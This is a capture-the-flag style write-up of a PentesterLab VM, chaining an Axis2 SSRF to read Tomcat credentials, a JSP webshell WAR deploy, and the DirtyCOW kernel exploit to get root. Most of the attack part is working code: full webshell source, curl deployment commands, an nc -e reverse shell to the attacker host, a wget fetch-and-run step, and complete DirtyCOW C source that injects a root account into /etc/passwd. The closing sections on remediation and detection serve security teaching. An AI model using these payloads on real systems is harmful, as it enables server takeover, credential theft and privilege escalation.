# VulnHub Axis2 and Tomcat Manager — SSRF to Root via DirtyCOW

Alright guys!! This one has everything: a Java web service with a file-read SSRF, a Tomcat Manager WAR deploy for RCE, and then the legendary DirtyCOW (CVE-2016-5195) to race-condition your way to root. Legit a classic boot2root from PentesterLab that covers three completely different attack primitives in a single chain. If you want to understand why exposing internal services matters, this VM nailed it.

Shoutout to PentesterLab for this exercise. It's a perfect case study of defense-in-depth failure where each layer individually looks "ok" until you chain them all together.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate / Medium |
| **Target VM** | Axis2 and Tomcat Manager (PentesterLab) |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://pentesterlab.com/exercises/axis2-and-tomcat-manager |
| **Techniques** | SSRF via file:// URI, credential harvesting, Tomcat WAR deployment, JSP webshell, DirtyCOW kernel exploit |
| **CVEs** | CVE-2010-0219 (Apache Axis2 default credentials), CVE-2016-5195 (DirtyCOW kernel privilege escalation) |
| **APT Groups** | APT41 (Java web service exploitation + WAR deploy), Lazarus Group (kernel exploit for privesc), APT28 (SSRF for internal credential harvesting) |

> **CISA KEV:** CVE-2016-5195 (DirtyCOW) is listed in the CISA Known Exploited Vulnerabilities catalog.

---

## Attack Summary

```
[host-discovery: nmap -sn]
    |
    v
[nmap: 22/tcp SSH | 80/tcp Apache + mod_jk]
    |
    v
[enumerate Axis2 at /axis2/ => ProxyService SSRF discovered]
    |
    v
[SSRF: file:///etc/tomcat6/tomcat-users.xml => manager:!mp0ss!bl32gu355]
    |
    v
[build JSP webshell WAR => deploy via Tomcat Manager]
    |
    v
[RCE as tomcat6 (uid=103)]
    |
    v
[reverse shell via nc -e]
    |
    v
[uname -r: 2.6.32 => DirtyCOW CVE-2016-5195]
    |
    v
[race condition overwrites /etc/passwd => firefart:firefart (uid=0)]
    |
    v
[SSH as firefart => ROOT]
```

---

## Methodology

1. Host discovery and port scan with Nmap
2. Service enumeration: discover Apache + mod_jk + Axis2
3. Axis2 ProxyService SSRF via `file://` URI
4. Harvest Tomcat Manager credentials from `tomcat-users.xml`
5. Build and deploy malicious JSP webshell WAR via Tomcat Manager
6. Gain reverse shell as `tomcat6`
7. Kernel version check: identify DirtyCOW vulnerable range
8. Compile and execute DirtyCOW exploit to overwrite `/etc/passwd`
9. SSH as injected root user (`firefart`), capture proof

---

## Step 1 — Identifying the Target

```bash
# Host discovery on the host-only network
nmap -sn 192.168.56.0/24
```

Target: **192.168.56.104** (Debian host)

```bash
# Detailed port scan
nmap -sV -p 22,80,8005,8009 192.168.56.104
```

Expected output:

```
22/tcp   open  ssh     OpenSSH (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.16 (Debian)
8005/tcp filtered  (Tomcat shutdown - loopback only)
8009/tcp filtered  (Tomcat AJP - loopback only)
```

Port 80 is Apache with `mod_jk` proxying to Tomcat 6 via AJP on 8009. Tomcat itself is not directly reachable from outside, but requests to Apache get forwarded. That `mod_jk` setup is the key: all Tomcat paths are accessible through port 80.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Step 2 — Enumerating the Axis2 Service

```bash
# Discover Axis2
curl -s http://192.168.56.104/ | grep -i axis

# List available services
curl -s "http://192.168.56.104/axis2/services/listServices"
```

Expected output (relevant part):

```xml
<serviceGroup name="ProxyService">
  <service name="ProxyService">
    <operation name="get"/>
  </service>
</serviceGroup>
```

```bash
# Inspect the WSDL to understand the get operation parameters
curl -s "http://192.168.56.104/axis2/services/ProxyService?wsdl" | grep -E 'get|uri'
```

The `get` operation accepts a `uri` string parameter and proxies the request. That includes `file://` URIs, which means we have arbitrary local file read. Bruh.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Step 3 — SSRF: Confirm File Read

> **What is SSRF?** Server-Side Request Forgery tricks the server into making requests on behalf of the attacker. When a service proxies arbitrary URIs without scheme validation, an attacker can use `file://` to read local files, `http://169.254.169.254/` to hit cloud metadata endpoints, or internal RFC-1918 addresses to pivot into internal networks. This maps to CWE-918 and OWASP A10:2021.

```bash
# Confirm arbitrary file read via file:// URI
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///etc/passwd"
```

Expected output: full contents of `/etc/passwd`. File read confirmed.

> **Real-world note:** Apache Axis2 default credentials (CVE-2010-0219) and SSRF in proxy services have been exploited by APT41 and FIN7 to pivot from DMZ-facing Java services into internal networks. The SSRF-to-credential-file chain is documented in multiple red team reports. Reference: CVE-2010-0219.

> **MITRE ATT&CK:** TA0009 Collection | T1005 Data from Local System | T1213 Data from Information Repositories

---

## Step 4 — SSRF: Harvest Tomcat Manager Credentials

```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml"
```

Expected output:

```xml
<tomcat-users>
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="tomcat" roles="tomcat"/>
  <user username="manager" password="!mp0ss!bl32gu355" roles="tomcat,manager-gui"/>
</tomcat-users>
```

Credentials: **`manager:!mp0ss!bl32gu355`** with `manager-gui` role. Noice.

Bonus: grab Axis2 admin credentials too:

```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml"
# Returns: admin:axis2
```

> **MITRE ATT&CK:** TA0006 Credential Access | T1552.001 Credentials in Files

---

## Step 5 — Build the JSP Webshell WAR

```bash
mkdir -p /tmp/ws/WEB-INF

cat > /tmp/ws/cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    p.waitFor();
    out.print(sb.toString());
}
%>
EOF

cat > /tmp/ws/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app><display-name>Shell</display-name></web-app>
EOF

cd /tmp/ws && jar -cvf /tmp/axshell.war .
```

> **MITRE ATT&CK:** TA0002 Execution | T1505.003 Server Software Component: Web Shell

---

## Step 6 — Deploy WAR via Tomcat Manager

Extract the CSRF token required by the Tomcat Manager upload form:

```bash
CSRF=$(curl -s -u "manager:!mp0ss!bl32gu355" \
  "http://192.168.56.104/manager/html" \
  -c /tmp/axis_cookies.txt \
  | grep -oP 'org\.apache\.catalina\.filters\.CSRF_NONCE=[A-F0-9]+' \
  | head -1 | cut -d= -f2)

echo "CSRF token: $CSRF"
```

Deploy the WAR:

```bash
curl -s -u "manager:!mp0ss!bl32gu355" \
  -b /tmp/axis_cookies.txt \
  "http://192.168.56.104/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -F "deployWar=@/tmp/axshell.war;type=application/octet-stream" | grep -i "OK\|deployed"
```

Confirm RCE:

```bash
curl -s -X POST "http://192.168.56.104/axshell/cmd.jsp" \
  --data-urlencode "cmd=id"
```

Expected output:

```
uid=103(tomcat6) gid=106(tomcat6) groups=106(tomcat6)
```

RCE confirmed as `tomcat6`. Rekt.

> **MITRE ATT&CK:** TA0001 Initial Access | T1190 Exploit Public-Facing Application

---

## Step 7 — Reverse Shell

On the attacker machine:

```bash
nc -lvnp 4445
```

Trigger the shell (Debian 6's `nc` supports `-e`):

```bash
curl -s -X POST "http://192.168.56.104/axshell/cmd.jsp" \
  --data-urlencode "cmd=nc -e /bin/bash 192.168.56.1 4445"
```

Interactive shell as `tomcat6 (uid=103)`.

> **MITRE ATT&CK:** TA0002 Execution | T1059.004 Unix Shell

---

## Step 8 — Kernel Version and DirtyCOW Identification

```bash
uname -r
# Linux debian 2.6.32-5-amd64
```

Kernel 2.6.32 is in the DirtyCOW vulnerable range: **2.6.22 through 4.8.3**.

> **What is DirtyCOW (CVE-2016-5195)?** A race condition in the Linux kernel's copy-on-write (COW) implementation allows an unprivileged process to write to read-only memory mappings. Two threads race: one calls `madvise(MADV_DONTNEED)` on a private read-only mapping of a file, while the other writes to `/proc/self/mem` at the same offset. The race wins and writes directly to the underlying physical page, bypassing COW. This allows any unprivileged user to overwrite files they can read, including `/etc/passwd`. CVE-2016-5195, CVSS 7.8, is in the CISA KEV catalog.

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1068 Exploitation for Privilege Escalation

---

## Step 9 — Compile and Execute DirtyCOW

**On the attacker machine**, compile a statically linked binary (static is required because the target's glibc is old):

```bash
cat > /tmp/dc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map; int f; struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 200000000; i++)
        c += madvise(map, 100, MADV_DONTNEED);
    printf("madvise %d\n", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR), i, c = 0;
    for (i = 0; i < 200000000; i++) {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n", c);
    return NULL;
}

int main() {
    char *payload = "firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash\n";
    f = open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
    pthread_t pth1, pth2;
    pthread_create(&pth1, NULL, madviseThread, payload);
    pthread_create(&pth2, NULL, procselfmemThread, payload);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
EOF

gcc -static -o /tmp/dc /tmp/dc.c -lpthread
```

Back up `/etc/passwd` on the target before running:

```bash
cp /etc/passwd /tmp/passwd.bak
```

Transfer and execute:

```bash
# On attacker: serve the binary
python3 -m http.server 8888 --directory /tmp &

# On target (tomcat6 shell):
wget http://192.168.56.1:8888/dc -O /tmp/dc && chmod +x /tmp/dc
/tmp/dc > /tmp/dc_out.txt 2>&1 &
```

Wait ~30 seconds, then verify:

```bash
head -1 /etc/passwd
# firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash
```

---

## Step 10 — Root Access via SSH

```bash
sshpass -p firefart ssh \
  -o StrictHostKeyChecking=no \
  -o HostKeyAlgorithms=ssh-rsa \
  firefart@192.168.56.104 \
  "id && hostname && uname -r"
```

Expected output:

```
uid=0(firefart) gid=0(root) groups=0(root)
debian
2.6.32-5-amd64
```

**(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Got root!! That DirtyCOW race condition just rewrote the game!!**

Cleanup: restore `/etc/passwd` when done:

```bash
sshpass -p firefart ssh -o HostKeyAlgorithms=ssh-rsa firefart@192.168.56.104 \
  "cp /tmp/passwd.bak /etc/passwd"
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Credential | `manager:!mp0ss!bl32gu355` | /etc/tomcat6/tomcat-users.xml via SSRF | Tomcat Manager WAR deploy |
| Credential | `admin:axis2` | axis2.xml via SSRF | Axis2 admin panel |
| Injected root | `firefart:firefart` (DES hash: fik57D3GJz/tk) | /etc/passwd overwritten via DirtyCOW | SSH root access |
| Root proof | `uid=0(firefart) gid=0(root) groups=0(root)` | SSH session | Root confirmed |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Axis2 ProxyService SSRF via `file://` URI | SSRF in cloud environments can reach metadata endpoints (169.254.169.254) or internal databases | Restrict allowed URI schemes; deny `file://`, `ftp://`, and internal RFC-1918 ranges |
| 2 | Tomcat Manager credentials in `tomcat-users.xml` readable via SSRF | Config files with plaintext credentials are a top target in internal recon | Restrict `tomcat-users.xml` to `tomcat6:tomcat6 640`; never expose Manager externally |
| 3 | Tomcat Manager exposed externally via mod_jk | Manager access from the internet has led to high-profile incidents | IP-restrict or completely remove `/manager/` and `/host-manager/` in `context.xml` |
| 4 | DirtyCOW (CVE-2016-5195) on unpatched kernel 2.6.32 | DirtyCOW was widely exploited by ransomware groups and APTs post-disclosure | Patch kernels; apply virtual patching via LSM (SELinux/AppArmor) rules |
| 5 | Static binary compilation to bypass old glibc | Attackers precompile exploits for known target OS versions on controlled machines | Monitor for unusual binary uploads to `/tmp`; restrict execution in world-writable dirs |

**Why does this matter outside the lab?**

This chain mirrors real incidents. The Tomcat Manager WAR deploy vector was used in multiple breaches to achieve initial RCE in enterprise environments (MegaCortex, various Java deserialization chains). DirtyCOW (CVE-2016-5195) was actively exploited in the wild after disclosure and remains in the CISA KEV catalog, meaning unpatched systems in government and critical infrastructure are still at risk. APT41 is documented using Java service exploitation plus kernel privesc as part of their intrusion methodology.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Network Service Discovery | T1046 |
| Reconnaissance | TA0043 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Credential Access | TA0006 | Credentials in Files | T1552.001 |
| Execution | TA0002 | Server Software Component: Web Shell | T1505.003 |
| Execution | TA0002 | Unix Shell | T1059.004 |
| Persistence | TA0003 | Create Account: Local Account | T1136.001 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation | T1068 |
| Defense Evasion | TA0005 | Modify Authentication Process | T1556 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Collection | TA0009 | Data from Local System (credential files) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Restrict Axis2 ProxyService to allowed URI schemes (`http://`, `https://` only); deny `file://`, `ftp://`, and RFC-1918 addresses.
2. Change default Tomcat Manager credentials immediately after deployment.
3. IP-restrict `/manager/` and `/host-manager/` to loopback or VPN-only addresses in `context.xml`.
4. Set `tomcat-users.xml` permissions to `tomcat6:tomcat6 640` (owner read/write, group read, no world).
5. Upgrade the kernel to at least 4.8.3 to patch DirtyCOW; apply virtual patching via SELinux/AppArmor policy in the interim.
6. Monitor `/tmp` and world-writable directories for executable file writes.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Block external access to `/manager/` at the firewall or load balancer level.
- Rotate all Tomcat and Axis2 credentials.
- Audit running processes and deployed WARs for unauthorized applications.
- If kernel exploit suspected: isolate the host; consider live response and memory forensics.

**MITRE D3FEND countermeasures:**
- D3-NI Network Isolation to cut lateral movement from the compromised Tomcat host (T1021.004)
- D3-PA Process Allow Listing to prevent unauthorized WAR execution (T1505.003)
- D3-FAPA File Access Pattern Analysis to detect reads of `tomcat-users.xml` via SSRF (T1552.001)
- D3-EAL Executable Allow Listing in `/tmp` to block DirtyCOW binary execution (T1068)

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.RA): Risk assessment must include SSRF attack surface in Java middleware.
- Protect (PR.AC-3): Remote access management; restrict Tomcat Manager to administrative networks.
- Protect (PR.DS-1): Protect credential files with least-privilege file permissions.
- Detect (DE.CM-1): Monitor for unauthorized WAR deployments and unusual Axis2 requests.
- Respond (RS.MI-1): Incident mitigation: block external Tomcat Manager access upon detection.
- Recover (RC.RP-1): Restore system from clean backup after DirtyCOW exploitation.

**NIST SP 800-53 Rev. 5 Controls:**
- AC-3: Access Enforcement (restrict Manager UI to authorized IP ranges)
- AC-6: Least Privilege (Axis2 service account should not read all local files)
- SI-2: Flaw Remediation (patch kernel CVE-2016-5195)
- CM-6: Configuration Settings (harden Tomcat Manager deployment)
- SC-7: Boundary Protection (restrict mod_jk proxied paths)

**CISA Known Exploited Vulnerabilities:**
- CVE-2016-5195 (DirtyCOW): listed in the CISA KEV catalog. Federal agencies required to remediate.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: THREAT (Threat and Vulnerability Management)
- Practice: Manage Vulnerabilities
- Target MIL: MIL-2 (patching within defined SLA based on CVSS severity)

---

## Final Thoughts

Thanks to PentesterLab for this exercise. It is one of the most elegant multi-stage chains you will find in a boot2root: SSRF to credential harvest, WAR deploy for RCE, and a textbook kernel exploit for privesc. Each stage teaches something independently valuable, and together they show exactly why a single misconfigured proxy service can be the entry point into full host compromise.

DirtyCOW in particular is worth understanding deeply: it is not just a CTF trick but a real vulnerability that was actively exploited post-disclosure and remains a reference point for Linux kernel race condition exploitation.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
